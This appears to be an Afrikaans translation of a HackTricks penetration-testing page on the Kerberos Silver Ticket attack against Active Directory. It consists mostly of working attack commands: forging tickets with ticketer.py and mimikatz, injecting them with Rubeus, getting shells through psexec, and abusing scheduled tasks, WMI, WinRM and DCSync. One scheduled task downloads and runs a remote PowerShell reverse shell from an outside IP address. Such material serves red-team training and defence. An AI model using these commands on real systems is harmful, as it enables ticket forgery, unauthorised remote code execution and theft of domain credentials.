# Silwermuntstuk

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

As jy belangstel in 'n **hackingsloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiend in Pools skriftelik en mondeling vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Silwermuntstuk

Die **Silwermuntstuk**-aanval behels die uitbuiting van dienskaartjies in Active Directory (AD)-omgewings. Hierdie metode maak staat op die **verkryging van die NTLM-hash van 'n diensrekening**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS)-kaartjie te vervals. Met hierdie vervalste kaartjie kan 'n aanvaller toegang verkry tot spesifieke dienste op die netwerk, **deur enige gebruiker voor te gee**, met die doel om tipies administratiewe voorregte te verkry. Dit word beklemtoon dat die gebruik van AES-sleutels vir die vervalsing van kaartjies veiliger en minder opspoorbaar is.

Verskillende gereedskap word gebruik vir kaartjievervaardiging, gebaseer op die bedryfstelsel:

### Op Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêersisteem te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.

## Beskikbare Dienste

| Diens Tipe                                | Diens Silver Tickets                                                      |
| ----------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                       | <p>HOST</p><p>HTTP</p><p>Afhanklik van die bedryfstelsel ook:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                     | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
| Geskeduleerde Take                        | HOST                                                                       |
| Windows-lêerdeling, ook psexec            | CIFS                                                                       |
| LDAP-operasies, ingesluit DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                            | krbtgt                                                                     |

Met behulp van **Rubeus** kan jy **vir almal** hierdie tickets vra deur die parameter te gebruik:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Gebeurtenis-ID's

* 4624: Rekening Aanmelding
* 4634: Rekening Aanmelding Af
* 4672: Admin Aanmelding

## Misbruik van Diens tickets

In die volgende voorbeelde stel ons voor dat die ticket verkry word deur die administrateurrekening te impersoneer.

### CIFS

Met hierdie ticket sal jy toegang hê tot die `C$` en `ADMIN$`-vouer via **SMB** (as dit blootgestel is) en lêers na 'n deel van die afgeleë lêersisteem kopieer deur iets soos die volgende te doen:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Jy sal ook in staat wees om 'n skulp binne die gasheer te verkry of willekeurige opdragte uit te voer met behulp van **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### GASHEER

Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars genereer en willekeurige opdragte uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### GASHEER + RPCSS

Met hierdie kaartjies kan jy **WMI uitvoer in die slagoffer se stelsel**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** in die volgende bladsy:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### GASHEER + WSMAN (WINRM)

Met winrm-toegang oor 'n rekenaar kan jy **daarop toegang kry** en selfs 'n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Kyk na die volgende bladsy om **meer maniere te leer om met 'n afgeleë gasheer te verbind deur gebruik te maak van winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Let daarop dat **winrm aktief en luisterend** op die afgeleë rekenaar moet wees om toegang daartoe te verkry.
{% endhint %}

### LDAP

Met hierdie bevoegdheid kan jy die DC-databasis dump deur gebruik te maak van **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Leer meer oor DCSync** op die volgende bladsy:

## Verwysings
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

As jy belangstel in 'n **hackerloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende skriftelike en gesproke Pools vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
